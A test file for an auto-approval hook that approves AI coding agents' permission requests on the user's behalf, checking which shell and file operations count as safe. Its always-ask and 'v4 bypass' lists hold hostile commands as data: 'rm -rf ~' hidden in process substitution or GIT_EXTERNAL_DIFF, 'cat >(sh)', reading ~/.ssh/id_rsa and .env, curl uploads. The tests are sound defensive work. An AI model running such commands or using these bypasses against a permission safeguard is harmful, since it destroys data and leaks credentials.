import { spawnSync } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  learnApprovals,
  normalizeApproval,
  parseApprovalEvents,
  recentAutoApprovals,
  revokeApproval,
  type ApprovalState,
} from '../src/core/auto-approve';
import { parseHookEvents } from '../src/core/hook-events';
import { shortActivity, type WorkSession } from '../src/core/progress';
import { ApprovalStore } from '../src/desktop/approvals';
import { HookInstaller, inboxPath } from '../src/desktop/hooks';

const scriptSource = fileURLToPath(new URL('../src/desktop/hook/xinban-hook.cjs', import.meta.url));

interface Verdict {
  keys: string[];
  risk: string;
}
interface Policy {
  classify(tool: string, input: unknown, cwd: string): Verdict;
  decide(
    source: string,
    keys: string[],
    risk: string,
    cwd: string,
    state: unknown,
    aliveAt: number,
    now: number,
  ): boolean;
  ALIVE_MS: number;
}
// 规则只有一份：直接 require 真正装进用户目录的那个脚本。
const policy = createRequire(import.meta.url)(scriptSource) as Policy;

const P = 'D:\\proj\\shop';
const bash = (command: string): Verdict => policy.classify('Bash', { command }, P);

describe('替你确认：哪些算「同类操作」', () => {
  it.each([
    ['npm test', ['npm test']],
    ['npm run build', ['npm run build']],
    ['git status && git diff --stat', ['git status', 'git diff']],
    ['npm run build 2>&1 | findstr error', ['npm run build', 'findstr']],
    ['node scripts/build.mjs --fast', ['node scripts/build.mjs']],
    [`cd ${P}\\web && npm test`, ['cd', 'npm test']],
    ['echo hi > out.txt', ['echo']],
    ['curl -sSL https://example.com/a.json', ['curl']],
    ['git commit -m "fix: 登录页"', ['git commit']],
    ['dir /s /b', ['dir']],
    ['Get-ChildItem -Recurse | Select-String foo', ['get-childitem', 'select-string']],
  ])('%s', (command, keys) => {
    expect(bash(command)).toEqual({ keys, risk: '' });
  });

  it('文件与网页工具', () => {
    expect(policy.classify('Edit', { file_path: `${P}\\src\\a.ts` }, P)).toEqual({
      keys: ['改文件'],
      risk: '',
    });
    // 大小写、斜杠不同也算同一项目。
    expect(policy.classify('Write', { file_path: 'd:/PROJ/shop/README.md' }, P).risk).toBe('');
    expect(policy.classify('Read', { file_path: `${P}\\src\\a.ts` }, P)).toEqual({
      keys: ['读文件'],
      risk: '',
    });
    // Grep / Glob 没给 path 就是在项目里搜。
    expect(policy.classify('Grep', { pattern: 'TODO' }, P)).toEqual({ keys: ['读文件'], risk: '' });
    expect(policy.classify('WebFetch', { url: 'https://github.com/a/b' }, P)).toEqual({
      keys: ['打开网页 github.com'],
      risk: '',
    });
  });
});

describe('替你确认：永远问你的清单', () => {
  it.each([
    ['rm -rf dist', '删除'],
    ['del /q build\\out.js', '删除'],
    ['Remove-Item .\\tmp -Recurse', '删除'],
    ['npm test && rm -rf node_modules', '删除'],
    ['find . -name "*.log" -delete', '删除'],
    ['git push origin main', 'git push'],
    ['git push --force', 'git push'],
    ['git reset --hard HEAD~1', 'reset --hard'],
    ['git checkout -- .', '丢弃'],
    ['git clean -fd', '清理'],
    ['cp -f a.txt b.txt', '强制覆盖'],
    ['move /y a.txt b.txt', '强制覆盖'],
    ['npm install lodash', '安装'],
    ['npm i', '安装'],
    ['yarn', '安装'],
    ['pnpm add -D vitest', '安装'],
    ['pip install requests', '安装'],
    ['npx create-vite app', '安装'],
    ['winget install foo', '安装'],
    ['cp a.txt C:\\Users\\me\\a.txt', '项目目录以外'],
    ['echo x > ..\\other\\f.txt', '项目目录以外'],
    ['cd C:\\other && npm test', '项目目录以外'],
    ['mkdir ~/x', '项目目录以外'],
    ['cat .env', '密钥'],
    ['type config\\.env.local', '密钥'],
    ['cat ~/.ssh/id_rsa', '密钥'],
    ['curl -d @data.json https://x.example', '上传'],
    ['curl -X POST https://x.example', '上传'],
    ['curl -F file=@a.zip https://x.example', '上传'],
    ['scp a.txt host:/tmp', '认不出'],
    ['frobnicate --all', '认不出'],
    ['echo $(whoami)', '认不出'],
    ['echo `id`', '认不出'],
    ['node -e "require(1)"', '认不出'],
    ['powershell -c Get-Date', '认不出'],
    ['bash -c "ls"', '认不出'],
    ['sudo ls', '认不出'],
    ['echo "unterminated', '认不出'],
    ['', '认不出'],
  ])('%s → %s', (command, reason) => {
    const verdict = bash(command);
    expect(verdict.keys).toEqual([]);
    expect(verdict.risk).toContain(reason);
  });

  // v4 堵住的绕过：每一条都曾经（或可能）被当成普通操作替你批掉。
  it.each([
    ['diff <(rm -rf ~) a.txt', '认不出'],
    ['cat >(sh)', '认不出'],
    ['GIT_EXTERNAL_DIFF="rm -rf ~ #" git diff', '认不出'],
    ['PAGER=sh git log', '认不出'],
    ['Write-Output (Remove-Item C:\\x -Recurse)', '认不出'],
    ['Get-ChildItem | ForEach-Object { Remove-Item $_ }', '认不出'],
    ['[IO.File]::Delete("a.txt")', '认不出'],
    ['echo ${HOME}', '认不出'],
    ['echo "$HOME"', '认不出'],
    ['type %USERPROFILE%\\notes.txt', '认不出'],
    ['Get-Content $env:USERPROFILE\\notes.txt', '认不出'],
    ['(ls)', '认不出'],
    ['node --require ./evil.js app.js', '认不出'],
    ['node --eval=1', '认不出'],
    ['node -pe 1', '认不出'],
    ['python -mhttp.server', '认不出'],
    ['cat ~/.ss*/id_*', '项目目录以外'],
    ['grep -r KEY C:\\Users\\me', '项目目录以外'],
    ['curl -o/c/Users/me/.bashrc https://x.example/a', '项目目录以外'],
    ['sort -o C:\\Windows\\x.txt a.txt', '项目目录以外'],
    ['curl -H @headers.txt https://x.example', '上传'],
    ['curl -K cfg.txt https://x.example', '上传'],
    ['curl --config=cfg.txt https://x.example', '上传'],
  ])('v4 绕过：%s → %s', (command, reason) => {
    const verdict = bash(command);
    expect(verdict.keys).toEqual([]);
    expect(verdict.risk).toContain(reason);
  });

  it('v4：项目里的工具配置与仓库内部文件、项目外的读，都交还给你', () => {
    for (const file of [
      '.claude\\settings.local.json',
      '.git\\config',
      '.git/hooks/pre-commit',
      '.vscode\\tasks.json',
      '.husky\\pre-push',
      '.github\\workflows\\ci.yml',
      '.codebuddy\\settings.json',
    ]) {
      expect(policy.classify('Edit', { file_path: `${P}\\${file}` }, P).risk).toContain('工具配置');
      expect(policy.classify('Write', { file_path: file }, P).risk).toContain('工具配置');
    }
    // .github 里其他文件、名字里只是带 git 的文件照常。
    expect(policy.classify('Edit', { file_path: `${P}\\.github\\README.md` }, P).risk).toBe('');
    expect(policy.classify('Edit', { file_path: `${P}\\.gitignore` }, P).risk).toBe('');
    expect(policy.classify('Read', { file_path: 'C:\\Windows\\win.ini' }, P).risk).toContain(
      '项目目录以外',
    );
    expect(policy.classify('Grep', { pattern: 'x', path: 'C:\\Users' }, P).risk).toContain(
      '项目目录以外',
    );
    expect(policy.classify('Glob', { pattern: '**/*', glob: '**/.env' }, P).risk).toContain('密钥');
  });

  it('v4 不误伤：引号里的括号、单引号里的 $、项目内通配符、Windows 开关', () => {
    expect(bash('git commit -m "fix (login): 登录页"')).toEqual({ keys: ['git commit'], risk: '' });
    expect(bash("grep -n 'price$' src/a.ts")).toEqual({ keys: ['grep'], risk: '' });
    expect(bash('grep -rn TODO src')).toEqual({ keys: ['grep'], risk: '' });
    expect(bash('ls src/*.ts')).toEqual({ keys: ['ls'], risk: '' });
    expect(bash('cat C:\\Windows\\win.ini')).toEqual({ keys: ['cat'], risk: '' });
    expect(bash('node scripts/build.mjs')).toEqual({ keys: ['node scripts/build.mjs'], risk: '' });
  });

  it('文件工具：项目外、密钥、认不出的工具', () => {
    expect(policy.classify('Edit', { file_path: 'C:\\Windows\\x.ini' }, P).risk).toContain(
      '项目目录以外',
    );
    expect(policy.classify('Write', { file_path: `${P}\\..\\other\\a.ts` }, P).risk).toContain(
      '项目目录以外',
    );
    expect(policy.classify('Edit', { file_path: `${P}\\.env` }, P).risk).toContain('密钥');
    expect(policy.classify('Read', { file_path: `${P}\\.env.production` }, P).risk).toContain(
      '密钥',
    );
    expect(policy.classify('Edit', { file_path: `${P}\\certs\\server.pem` }, P).risk).toContain(
      '密钥',
    );
    expect(policy.classify('Edit', {}, P).risk).not.toBe('');
    expect(policy.classify('mcp__github__create_issue', {}, P).risk).toContain('认不出的工具');
    expect(policy.classify('WebFetch', { url: 'not a url' }, P).risk).not.toBe('');
  });
});

describe('替你确认：什么时候真的批', () => {
  const state = {
    v: 1,
    rev: 2,
    enabled: true,
    grants: [
      { source: 'claude-code', project: 'd:/proj/shop/', key: 'npm test', at: 1 },
      { source: 'claude-code', project: P, key: 'git status', at: 1 },
    ],
  };
  const now = 1_000_000;

  it('每一类都批过、同项目同来源、开关开着、芯伴开着，才批', () => {
    expect(policy.decide('claude-code', ['npm test'], '', P, state, now, now)).toBe(true);
    expect(policy.decide('claude-code', ['npm test', 'git status'], '', P, state, now, now)).toBe(
      true,
    );
    // 有一类没批过就不批。
    expect(policy.decide('claude-code', ['npm test', 'git diff'], '', P, state, now, now)).toBe(
      false,
    );
    // 别的项目、别的工具不共享。
    expect(policy.decide('claude-code', ['npm test'], '', 'D:\\proj\\other', state, now, now)).toBe(
      false,
    );
    expect(policy.decide('workbuddy', ['npm test'], '', P, state, now, now)).toBe(false);
    // 高风险、开关关了、心跳过期、状态坏了：一律不批。
    expect(policy.decide('claude-code', ['npm test'], '删除文件', P, state, now, now)).toBe(false);
    expect(
      policy.decide('claude-code', ['npm test'], '', P, { ...state, enabled: false }, now, now),
    ).toBe(false);
    expect(
      policy.decide('claude-code', ['npm test'], '', P, state, now - policy.ALIVE_MS - 1, now),
    ).toBe(false);
    expect(policy.decide('claude-code', ['npm test'], '', P, null, now, now)).toBe(false);
    // 旧规则修订号学到的授权不认：哪怕主进程还没来得及重置文件。
    const { rev: _rev, ...old } = state;
    expect(policy.decide('claude-code', ['npm test'], '', P, old, now, now)).toBe(false);
    expect(policy.decide('claude-code', ['npm test'], '', P, { ...state, rev: 1 }, now, now)).toBe(
      false,
    );
    expect(policy.decide('claude-code', [], '', P, state, now, now)).toBe(false);
  });
});

function rec(record: Record<string, unknown>): string {
  return `${JSON.stringify({ v: 1, src: 'claude', sid: 's1', cwd: P, ...record })}\n`;
}

describe('从你的批准里学', () => {
  const empty: ApprovalState = { v: 1, rev: 2, enabled: true, grants: [], learnedThrough: 0 };
  const request = (at: number, extra: Record<string, unknown> = {}) =>
    rec({
      ev: 'PermissionRequest',
      tool: 'Bash',
      keys: ['npm test'],
      risk: '',
      fp: 'f1',
      at,
      ...extra,
    });
  const used = (at: number, extra: Record<string, unknown> = {}) =>
    rec({ ev: 'PostToolUse', tool: 'Bash', keys: ['npm test'], fp: 'f1', at, ...extra });

  it('弹窗后同一会话里真的跑了 = 你批了；只学一次', () => {
    const events = parseApprovalEvents(request(100) + used(200));
    const next = learnApprovals(empty, events);
    expect(next.grants).toEqual([{ source: 'claude-code', project: P, key: 'npm test', at: 200 }]);
    expect(next.learnedThrough).toBe(200);
    expect(learnApprovals(next, events)).toBe(next);
  });

  it('拒绝了（没跑）、芯伴自己批的、高风险的、类别对不上的，都不学', () => {
    const cases = [
      request(100),
      request(100, { auto: true }) + used(200),
      request(100, { risk: '删除文件', keys: [] }) + used(200, { keys: [] }),
      request(100) + used(200, { keys: ['npm run build'] }),
      request(100) + used(200, { sid: 'other' }),
      used(200),
      // 你拒了弹窗里的那一条，它接着跑了另一条同类命令：指纹对不上。
      request(100) + used(200, { fp: 'f2' }),
      // 钩子 v3 的旧记录没有指纹。
      request(100, { fp: undefined }) + used(200, { fp: undefined }),
    ];
    for (const raw of cases) {
      expect(learnApprovals(empty, parseApprovalEvents(raw)).grants).toEqual([]);
    }
  });

  it('同一会话并行的两条同名工具调用各配各的', () => {
    const raw =
      request(100, { fp: 'a' }) +
      request(110, { fp: 'b', keys: ['npm run build'] }) +
      used(200, { fp: 'b', keys: ['npm run build'] }) +
      used(210, { fp: 'a' });
    expect(
      learnApprovals(empty, parseApprovalEvents(raw))
        .grants.map((g) => g.key)
        .sort(),
    ).toEqual(['npm run build', 'npm test']);
  });

  it('开关关着不学；打开后也不会把关着时的批准补学回来', () => {
    const raw = request(100) + used(200);
    const off = learnApprovals({ ...empty, enabled: false }, parseApprovalEvents(raw));
    expect(off.grants).toEqual([]);
    expect(off.learnedThrough).toBe(200);
    expect(learnApprovals({ ...off, enabled: true }, parseApprovalEvents(raw)).grants).toEqual([]);
  });

  it('请求和执行分两次刷新到达也能配上', () => {
    const first = learnApprovals(empty, parseApprovalEvents(request(100)));
    expect(first.grants).toEqual([]);
    const second = learnApprovals(first, parseApprovalEvents(request(100) + used(200)));
    expect(second.grants).toHaveLength(1);
  });

  it('撤销后不会被旧事件重新学回来；你再批一次才回来', () => {
    const raw = request(100) + used(200);
    const learned = learnApprovals(empty, parseApprovalEvents(raw));
    const revoked = revokeApproval(learned, {
      source: 'claude-code',
      project: 'd:/proj/shop',
      key: 'npm test',
    });
    expect(revoked.grants).toEqual([]);
    expect(learnApprovals(revoked, parseApprovalEvents(raw)).grants).toEqual([]);
    const again = learnApprovals(revoked, parseApprovalEvents(raw + request(300) + used(400)));
    expect(again.grants).toHaveLength(1);
  });

  it('最近替你批的，和工作进度上的那一句', () => {
    const raw = request(100) + used(150) + request(300, { auto: true });
    expect(recentAutoApprovals(parseApprovalEvents(raw))).toEqual([
      { at: 300, source: 'claude-code', project: P, keys: ['npm test'] },
    ]);
    const [signal] = parseHookEvents(raw);
    expect(signal).toMatchObject({ kind: 'working', detail: '已替你批准：npm test' });
    const session = { signal: 'working', signalDetail: signal!.detail, runningTool: '' };
    expect(shortActivity(session as WorkSession)).toBe('已替你批准：npm test');
    // 没替你批的权限请求仍然是「在等你」。
    expect(parseHookEvents(request(100))[0]).toMatchObject({ kind: 'waiting' });
  });

  it('坏文件一律当「关着、什么都没批过」', () => {
    expect(normalizeApproval('garbage')).toMatchObject({ enabled: false, grants: [] });
    expect(
      normalizeApproval({
        v: 1,
        rev: 2,
        enabled: true,
        grants: [{ source: 'evil', project: 'x', key: 'k', at: 1 }],
      }),
    ).toMatchObject({ enabled: true, grants: [] });
  });

  it('旧规则修订号：安全重置成关着、没有授权，但记得学到哪里', () => {
    const old = {
      v: 1,
      enabled: true,
      grants: [{ source: 'claude-code', project: P, key: 'npm test', at: 1 }],
      learnedThrough: 500,
    };
    expect(normalizeApproval(old)).toEqual({
      v: 1,
      rev: 2,
      enabled: false,
      grants: [],
      learnedThrough: 500,
    });
  });
});

describe('真脚本 + 桌面侧', () => {
  let dir = '';
  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'xinban-approve-'));
  });
  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('学会→心跳→钩子当场批准；高风险、关开关、芯伴退出都不批', async () => {
    const data = join(dir, 'data');
    const installer = new HookInstaller(
      {
        dataDir: data,
        claudeHome: join(dir, '.claude'),
        codexHome: join(dir, '.codex'),
        workbuddyHome: join(dir, '.workbuddy'),
        codebuddyHome: join(dir, '.codebuddy'),
        scriptSource,
      },
      () => 0,
      async () => true,
    );
    expect(await installer.apply('claude-code', 'install')).toEqual({ ok: true });
    const hooks = join(data, 'hooks');
    const script = join(hooks, 'xinban-hook.cjs');
    const inbox = inboxPath(data);
    const cwd = join(dir, 'shop');
    await mkdir(cwd, { recursive: true });
    const ask = (command: string, src = 'claude') =>
      spawnSync(process.execPath, [script, src, inbox], {
        input: JSON.stringify({
          session_id: 's1',
          hook_event_name: 'PermissionRequest',
          cwd,
          tool_name: 'Bash',
          tool_input: { command },
        }),
        encoding: 'utf8',
        timeout: 10_000,
      });
    const ran = (command: string) =>
      spawnSync(process.execPath, [script, 'claude', inbox], {
        input: JSON.stringify({
          session_id: 's1',
          hook_event_name: 'PostToolUse',
          cwd,
          tool_name: 'Bash',
          tool_input: { command },
          tool_response: { stdout: 'private output' },
        }),
        encoding: 'utf8',
        timeout: 10_000,
      });

    const store = new ApprovalStore(hooks);
    await store.load();
    await store.setEnabled(true);
    store.start();
    try {
      // 第一次：芯伴还没学会，不替你批。你在弹窗里批了，它跑了。
      const first = ask('npm test -- --grep secret-arg');
      expect(first.status).toBe(0);
      expect(first.stdout).toBe('');
      expect(ran('npm test -- --grep secret-arg').status).toBe(0);
      await store.learn(await readFile(inbox, 'utf8'));
      expect(store.view().grants.map((g) => g.key)).toEqual(['npm test']);

      // 第二次：同类操作，芯伴当场批准。
      await new Promise((resolve) => setTimeout(resolve, 50));
      const second = ask('npm test');
      expect(second.status).toBe(0);
      expect(JSON.parse(second.stdout)).toEqual({
        hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } },
      });
      // WorkBuddy 的同一个操作不共享 Claude Code 的批准。
      expect(ask('npm test', 'workbuddy').stdout).toBe('');
      // 高风险永远问你，哪怕前半句批过。
      expect(ask('npm test && rm -rf dist').stdout).toBe('');

      const text = await readFile(inbox, 'utf8');
      expect(text).not.toContain('secret-arg');
      expect(text).not.toContain('private output');
      await store.learn(text);
      expect(store.view().recent[0]).toMatchObject({ keys: ['npm test'] });

      // 关掉开关：不再批。
      await store.setEnabled(false);
      expect(ask('npm test').stdout).toBe('');
      await store.setEnabled(true);
      expect(ask('npm test').stdout).not.toBe('');
    } finally {
      await store.stop();
    }
    // 芯伴退出：心跳删掉，钩子不再替你批。
    await expect(stat(join(hooks, 'alive'))).rejects.toThrow();
    expect(ask('npm test').stdout).toBe('');
    // 心跳太旧（芯伴崩溃）同样不批。
    await writeFile(join(hooks, 'alive'), String(Date.now() - policy.ALIVE_MS - 5_000));
    expect(ask('npm test').stdout).toBe('');
    // approve.json 只由主进程写：脚本跑了这么多次也没改过它的内容结构。
    const saved = normalizeApproval(
      JSON.parse(await readFile(join(hooks, 'approve.json'), 'utf8')),
    );
    expect(saved.grants.map((g) => g.key)).toEqual(['npm test']);
    // 同步起十来个 node 进程：全量并行跑时 5 秒不够。
  }, 30_000);

  it('升级：旧 approve.json 当场重置并写回；已装的旧脚本副本被刷新', async () => {
    const data = join(dir, 'data');
    const hooks = join(data, 'hooks');
    await mkdir(hooks, { recursive: true });
    await writeFile(
      join(hooks, 'approve.json'),
      JSON.stringify({
        v: 1,
        enabled: true,
        grants: [{ source: 'claude-code', project: 'd:/x', key: 'npm test', at: 1 }],
        learnedThrough: 9,
      }),
    );
    const store = new ApprovalStore(hooks);
    await store.load();
    expect(store.view()).toMatchObject({ enabled: false, grants: [] });
    expect(JSON.parse(await readFile(join(hooks, 'approve.json'), 'utf8'))).toEqual({
      v: 1,
      rev: 2,
      enabled: false,
      grants: [],
      learnedThrough: 9,
    });

    const installer = new HookInstaller(
      {
        dataDir: data,
        claudeHome: join(dir, '.claude'),
        codexHome: join(dir, '.codex'),
        workbuddyHome: join(dir, '.workbuddy'),
        codebuddyHome: join(dir, '.codebuddy'),
        scriptSource,
      },
      () => 0,
      async () => true,
    );
    const script = join(hooks, 'xinban-hook.cjs');
    // 没装过：不凭空写脚本。
    await rm(script, { force: true });
    expect(await installer.refreshScript()).toBe(false);
    await expect(stat(script)).rejects.toThrow();
    // 装过旧版：刷成当前版；再调一次不动。
    await writeFile(script, '// xinban-hook v3\n');
    expect(await installer.refreshScript()).toBe(true);
    expect(await readFile(script, 'utf8')).toBe(await readFile(scriptSource, 'utf8'));
    expect(await installer.refreshScript()).toBe(false);
  });
});
